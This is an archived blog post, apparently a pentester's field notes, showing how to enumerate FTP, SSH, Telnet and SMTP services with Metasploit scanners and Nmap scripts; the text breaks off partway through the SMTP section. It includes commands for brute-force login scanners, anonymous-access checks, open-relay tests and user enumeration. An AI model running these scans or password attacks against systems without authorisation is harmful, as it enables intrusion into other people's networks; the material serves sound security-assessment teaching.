
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Learning From the Field: Basic Network Hygiene - tech.bitvijays.com</title>
  <meta name="author" content="Vijay Kumar">

  
  <meta name="description" content="So, by using intelligence gathering you have completed the normal scanning and banner grabbing. Yay!!. Now, it&rsquo;s time for some metasploit-fu &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://bitvijays.github.io/blog/2016/03/03/learning-from-the-field-basic-network-hygiene/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="tech.bitvijays.com" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">tech.bitvijays.com</a></h1>
  
    <h2>The Magic of Learning.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="bitvijays.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Learning From the Field: Basic Network Hygiene</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2016-03-03T13:47:44+05:30'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2016</span></span> <span class='time'>1:47 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>So, by using <strong>intelligence gathering</strong> you have completed the normal scanning and banner grabbing. Yay!!. Now, it&rsquo;s time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>.</p>

<!-- more -->


<p>
So we start with creating a new workspace in the msfconsole for better work.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfconsole -q -- Starts Metasploit Console quietly
</span><span class='line'>workspace -a &lt;Engagement_Name&gt; -- Add a new workspace with the engagement name specified
</span><span class='line'>workspace &lt;Engagement_Name&gt; -- Switch to the new workspace</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s import all the nmap xml file of different network ranges</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>db_import /root/Documents/Project_Location/Engagement_Name/Internal/Site_10.*.*.0_*/nmap_scans/Port_Scan/*.xml</span></code></pre></td></tr></table></div></figure>


<p>After all the importing, it&rsquo;s important to check what all services/ports are running to get a feel of different possibilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -c port,name -u -o /tmp/ports 
</span><span class='line'>^ -u is used for only showing ports which are open.</span></code></pre></td></tr></table></div></figure>


<p>This will write a file in /tmp/ports containing the port number and it&rsquo;s name. info could also be used to get more information.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /tmp/ports | cut -d , -f2,3 | sort | uniq | tr -d \" | grep -v -E 'port|tcpwrapped' | sort -n</span></code></pre></td></tr></table></div></figure>


<p>This will provide you the sorted ports running on the network which can be then viewed to probe further.</p>

<p>A sample output is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>***SNIP**
</span><span class='line'>20,ftp-data
</span><span class='line'>21,ftp
</span><span class='line'>22,ssh
</span><span class='line'>23,landesk-rc
</span><span class='line'>23,telnet
</span><span class='line'>24,priv-mail
</span><span class='line'>25,smtp
</span><span class='line'>25,smtp-proxy
</span><span class='line'>***SNIP**</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s move <strong>port by port</strong> and check what metasploit framework and nmap nse has to offer. By no means, this is a complete list, new ports, metasploit modules, nmap nse will be added as used. This post currently covers the below ports / services.</p>

<ul>
<li>FTP | Port 21</li>
<li>SSH | Port 22</li>
<li>Telnet | Port 23</li>
<li>SMTP | Port 25 and Submission Port 587</li>
<li>DNS | Port 53</li>
<li>Finger | Port 79</li>
<li>HTTP </li>
<li>Kerberos | Port 88</li>
<li>NetBios</li>
<li>POP3 | Port 110</li>
<li>RPCInfo | Port 111</li>
<li>Ident | Port 113</li>
<li>SNMP | Port 161</li>
<li>Check Point FireWall-1 Topology | Port 264 </li>
<li>LDAP | Port 389</li>
<li>SMB | Port 445</li>
<li>rexec | Port 512</li>
<li>rlogin | Port 513</li>
<li>RSH | port 514</li>
<li>AFP | Apple Filing Protocol | Port 548</li>
<li>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</li>
<li>HTTPS | Port 443 and 8443 </li>
<li>RTSP | Port 554 and 8554</li>
<li>Rsync | Port 873</li>
<li>Java RMI | Port 1099</li>
<li>MS-SQL | Port 1433</li>
<li>Oracle | Port 1521</li>
<li>MySQL | Port 3306</li>
<li>ISCSI | Port 3260</li>
<li>Postgresql | Port 5432</li>
<li>VNC | Port 5900</li>
<li>X11 | Port 6000</li>
<li>PJL | Port 9100</li>
<li>Apache Cassandra | Port 9160</li>
<li>Network Data Management Protocol (ndmp) | Port 10000</li>
<li>Memcache | Port 11211</li>
<li>MongoDB | Port 27017 and Port 27018</li>
<li>EthernetIP-TCP-UDP | Port 44818</li>
<li>UDP BACNet | Port 47808</li>
</ul>


<h3>FTP | Port 21</h3>

<p>So, on a network we can find multiple version of ftp servers running. Let&rsquo;s find out by</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>services -p 21 -c info -o /tmp/ftpinfo
</span><span class='line'>cat /tmp/ftpinfo | cut -d , -f2 | sort | uniq</span></code></pre></td></tr></table></div></figure>


<p>A Sample output is</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Alfresco Document Management System ftpd"
</span><span class='line'>"D-Link Printer Server ftpd"
</span><span class='line'>"FreeBSD ftpd 6.00LS"
</span><span class='line'>"HP JetDirect ftpd"
</span><span class='line'>"HP LaserJet P4014 printer ftpd"
</span><span class='line'>"Konica Minolta bizhub printer ftpd"
</span><span class='line'>"Microsoft ftpd"
</span><span class='line'>"National Instruments LabVIEW ftpd"
</span><span class='line'>"NetBSD lukemftpd"
</span><span class='line'>"Nortel CES1010E router ftpd"
</span><span class='line'>"oftpd"
</span><span class='line'>"OpenBSD ftpd 6.4 Linux port 0.17"
</span><span class='line'>"PacketShaper ftpd"
</span><span class='line'>"ProFTPD 1.3.3"
</span><span class='line'>"Pure-FTPd"
</span><span class='line'>"Ricoh Aficio MP 2000 printer ftpd 6.15"
</span><span class='line'>"Ricoh Aficio MP 2000 printer ftpd 6.17"
</span><span class='line'>"Ricoh Aficio MP 2352 printer ftpd 10.67"
</span><span class='line'>"Ricoh Aficio MP 4002 printer ftpd 11.103"
</span><span class='line'>"Ricoh Aficio MP W3600 printer ftpd 6.15"
</span><span class='line'>"Ricoh Aficio SP 3500SF printer ftpd 75905e"
</span><span class='line'>"vsftpd"
</span><span class='line'>"vsftpd 2.0.4+ (ext.3)"
</span><span class='line'>"vsftpd 2.0.5"
</span><span class='line'>"vsftpd 2.0.8 or later"
</span><span class='line'>"vsftpd 2.2.2"
</span><span class='line'>"vsftpd 3.0.2"
</span><span class='line'>"vsftpd (before 2.0.8) or WU-FTPD"
</span><span class='line'>"WU-FTPD or MIT Kerberos ftpd 5.60"
</span><span class='line'>"WU-FTPD or MIT Kerberos ftpd 6.00L</span></code></pre></td></tr></table></div></figure>


<p><strong>Metasploit</strong> provides</p>

<ol>
<li> <strong>FTP Version Scanner</strong> which detects the ftp version.
This can be done using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/ftp_version
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 BDL095XXXX FTP server ready.\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 (vsFTPd 2.0.5)\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
</span><span class='line'>[*] 172.16.xx.xx:21 FTP Banner: '220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a'
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>Anonymous FTP Access Detection</strong> which detect anonymous (read/write) FTP server access.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/anonymous
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
A sample of results is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)
</span><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)
</span><span class='line'>[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)</span></code></pre></td></tr></table></div></figure>
</li>
 
<li><strong>FTP Authentication Scanner</strong> which is a FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ftp/ftp_login
</span><span class='line'>services -p 21 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Yet to run</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>FTP Bounce Port Scanner</strong> which enumerate TCP services via the FTP bounce PORT/LIST method.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/portscan/ftpbounce</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon.nse</a> : Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV --script ftp-anon -p 21 10.10.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 21:53 IST
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.018s latency).
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp     vsftpd 2.2.2
</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span><span class='line'>|_drwxr-xr-x    2 0        0            4096 Jun 25  2011 pub
</span><span class='line'>Service Info: OS: Unix</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ftp-brute.html">ftp-brute.nse</a> : Performs brute force password auditing against FTP servers.</li>
<li><a href="https://nmap.org/nsedoc/scripts/ftp-bounce.html">ftp-bounce.nse</a> : Checks to see if an FTP server allows port scanning using the FTP bounce method.</li>
</ol>


<h3>SSH | Port 22</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li> <strong>SSH Version Scanner</strong> which detects SSH version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssh/ssh_version
</span><span class='line'>services -p 22 -u -R</span></code></pre></td></tr></table></div></figure>
A Sample output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-OpenSSH_5.8 ( service.version=5.8 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH )
</span><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-9nroL
</span><span class='line'>[*] 10.23.xx.xx:22 SSH server version: SSH-1.99-Cisco-1.25 ( service.version=1.25 service.vendor=Cisco service.product=SSH os.vendor=Cisco os.product=IOS os.certainty=0.8 )</span></code></pre></td></tr></table></div></figure>
</li>
There's a auxilary module to try 
<li><strong>SSH Brute force</strong> which is SSH Login Check Scanner will test ssh logins on a range of machines and report successful logins. Caution: BruteForce.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/ssh/ssh_login
</span><span class='line'>services -p 22 -u -R</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has three NSE</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html">ssh2-enum-algos.nse</a> Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script ssh2-enum-algos -p 22 -n 103.206.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:04 IST
</span><span class='line'>Nmap scan report for 103.206.xx.xx
</span><span class='line'>Host is up (0.018s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>| ssh2-enum-algos: 
</span><span class='line'>|   kex_algorithms: (4)
</span><span class='line'>|       diffie-hellman-group-exchange-sha256
</span><span class='line'>|       diffie-hellman-group-exchange-sha1
</span><span class='line'>|       diffie-hellman-group14-sha1
</span><span class='line'>|       diffie-hellman-group1-sha1
</span><span class='line'>|   server_host_key_algorithms: (2)
</span><span class='line'>|       ssh-dss
</span><span class='line'>|       ssh-rsa
</span><span class='line'>|   encryption_algorithms: (9)
</span><span class='line'>|       aes128-ctr
</span><span class='line'>|       aes192-ctr
</span><span class='line'>|       aes256-ctr
</span><span class='line'>|       aes128-cbc
</span><span class='line'>|       aes192-cbc
</span><span class='line'>|       aes256-cbc
</span><span class='line'>|       blowfish-cbc
</span><span class='line'>|       3des-cbc
</span><span class='line'>|       none
</span><span class='line'>|   mac_algorithms: (2)
</span><span class='line'>|       hmac-sha1
</span><span class='line'>|       hmac-md5
</span><span class='line'>|   compression_algorithms: (1)
</span><span class='line'>|_      none
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/ssh-hostkey.html">ssh-hostkey.nse</a>: Shows SSH hostkeys
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script ssh-hostkey -p 22 -n 103.206.xx.xx --script-args ssh_hostkey=full
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 22:07 IST
</span><span class='line'>Nmap scan report for 103.206.xx.xx
</span><span class='line'>Host is up (0.019s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   ssh-dss AAAAB3NzaC1kc3MAAACBAOohTo8BeSsafI78mCTp7vz1ETkdSXNj8wgrYMD+DOEDpdfMEqYJOFPUWiyK0HrkyrP7UyODp9SEcrOzem98iDUgvPZFfSRhKpdTktQtt9+9mzDpfHgqryD04o2JvjZc6HlMwZToulurZwgt0+npep8Asb32lRCGAkFpPA7r3NdfAAAAFQDypzDnHTTgcy/vQNUDe+RlnFxX0wAAAIAXBBnv/P1RyzGdGM+JX2tbM6gJvC4WNoq7Okdh1ZH2Rxn1plU+oTt189ZI5UcR67x504o5fXVZ0pj3yJh6yMQFfsw89iSbTGmM6V1wYnq+s1Lz83XvgHIepV0OdOj2HE4tCytS6md0udLSio6RlWTVG/8vFrwb/C2KoL36JiIABgAAAIAUTOQm2+LVNqISuZT/doDbz5H89dCbLyL0uNiPRGW3XGjsZrW/iyvN/FQ1Lz0vai1db3UPbkNvhQNhOIJtAYClyQg1bTjvBCV2YvG9P91Ljyl6avSUoPEDg7h46E90TpneFa0tRf+V3RBC4KbXHrelgHye+2ZUkaebOmsRt2h4sQ==
</span><span class='line'>|_  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIRocXKgi0l3kZeVNEPlMXBBDj4WYAPFzNgf63+e/RMN5DSYz4AmVw1V8o+gsaL3mCeMwRdMfPCVlDdFPRDbZhyXNiG2vstc+gbeOHyDaLuQJVMF/++M8Yw9GWr7dOOA9zUfRkYVrQT53bfYzSpiulZpAbnkY0X5Ma40aO56Sq4H1NNqb7ZBdCWmder3veBq+6R9z+xSY0ji5Csr52bIl2Bka36KfYx325rrUP//lWDUDwK+hQ8jL9EjP884uPflRJPqdxoWLK001exSPHmcZOFNCeb2TQSkTbJVIh5Qg55eel2d0f/YZe24b6SalaANsZHt9MyG6Q5DNbtWvV2ixV
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/sshv1.html">sshv1.nse</a>: Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script sshv1 -p 22 -n 203.134.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-03 23:16 IST
</span><span class='line'>Nmap scan report for 203.134.xx.xx
</span><span class='line'>Host is up (0.042s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>|_sshv1: Server supports SSHv1</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Telnet | Port 23</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Telnet version</strong> which detects telnet version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/telnet/telnet_version
</span><span class='line'>services -p 23 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.13.xx.xx:23 TELNET (ttyp0)\x0d\x0a\x0d\x0alogin:
</span><span class='line'>[*] 10.13.xx.xx:23 TELNET User Access Verification\x0a\x0aUsername:</span></code></pre></td></tr></table></div></figure>
One sad thing is telnet_version overwrites the Nmap banner, which is most probably not good. Need to check how we can avoid this. may be not run version modules?

We could have used nmap banners for telnet for example: below for the SNMP modules. As routers/switches are mostly uses SNMP. 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>10.23.xx.xx   23    tcp    telnet      open   Usually a Cisco/3com switch
</span><span class='line'>10.23.xx.xx   23    tcp    telnet      open   Aruba switch telnetd
</span><span class='line'>10.87.xx.xx    23    tcp    telnet      open   Dell PowerConnect switch telnetd
</span><span class='line'>10.10.xx.xx   23    tcp    telnet      open   Cisco router telnetd
</span><span class='line'>10.10.xx.xx    23    tcp    telnet      open   Pirelli NetGate VOIP v2 broadband router telnetd</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>Telnet Login Check Scanner</strong> which will test a telnet login on a range of machines and report successful logins.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/telnet/telnet_login
</span><span class='line'>services -p 23 -u -R</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has two NSEs</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/telnet-brute.html">telnet-brute.nse</a> : Performs brute-force password auditing against telnet servers.</li>
and 
<li><a href="https://nmap.org/nsedoc/scripts/telnet-encryption.html">telnet-encryption.nse</a> : Determines whether the encryption option is supported on a remote telnet server. </li>
</ol>


<h3>SMTP | Port 25 and Submission Port 587</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>SMTP_Version</strong> which is a SMTP Banner Grabber.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_version
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>

Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:25 SMTP 220 xxxx.example.com Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:22:44 +0530 \x0d\x0a
</span><span class='line'>[*] 10.10.xx.xx:25 SMTP 220 smtpsrv.example.com ESMTP Sendmail; Thu, 3 Mar 2016 18:22:39 +0530\x0d\x0a</span></code></pre></td></tr></table></div></figure>
</li>

<li><strong>SMTP Open Relays</strong> which tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_relay
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>
You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;
</span><span class='line'>[*] 172.16.xx.xx:25 - No relay detected
</span><span class='line'>[+] 172.16.xx.xx:25 - Potential open SMTP relay detected: - MAIL FROM:&lt;sender@example.com&gt; -&gt; RCPT TO:&lt;target@example.com&gt;</span></code></pre></td></tr></table></div></figure>

</li>

<li><strong>SMTP User Enumeration Utility</strong> which allows allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
